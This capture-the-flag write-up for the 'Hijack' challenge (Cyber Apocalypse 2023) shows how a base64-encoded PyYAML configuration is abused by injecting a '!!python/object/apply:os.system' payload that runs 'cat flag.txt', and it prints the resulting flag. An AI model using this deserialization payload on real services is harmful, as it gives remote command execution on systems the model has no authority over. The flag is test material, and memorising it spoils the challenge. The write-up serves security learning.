# Cyber Apocalypse 2023

## Hijack

> The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?
>
>  Author: N/A
>

Tags: _misc_

## Solution
When connecting to the container we are presented with an small UI:
```bash
$ nc 138.68.162.218 32738

<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
>
```

First thing is to test what we can do. Create config let's us enter some values and returns the configuration.

```bash
> 1

- Creating new config -
Temperature units (F/C/K): F
Propulsion Components Target Temperature : 1
Solar Array Target Temperature : 1
1Infrared Spectrometers Target Temperature :
Auto Calibration (ON/OFF) : on

Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxJywgYXV0b19jYWxpYnJhdGlvbjogJ29uJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxJywgc29sYXJfYXJyYXlfdGVtcDogJzEnLCB1bml0czogRn0K
Uploading to ship...
```

When decoding the base64 string we get some PyYaml.
```bash
$ echo "ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxJywgYXV0b19jYWxpYnJhdGlvbjogJ29uJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxJywgc29sYXJfYXJyYXlfdGVtcDogJzEnLCB1bml0czogRn0K" | base64 -d
!!python/object:__main__.Config {IR_spectrometer_temp: '1', auto_calibration: 'on',
  propulsion_temp: '1', solar_array_temp: '1', units: F}
```

That looks interesting since we can probably pack our own payload into it.

```bash
echo -n '!!python/object/apply:os.system ["cat flag.txt"]' | base64
ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImNhdCBmbGFnLnR4dCJd
```

And sure enough, when uploading the payload...
```bash
<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 2

Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImNhdCBmbGFnLnR4dCJd
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
** Success **
Uploading to ship...
```

... we are presented with the flag `HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`.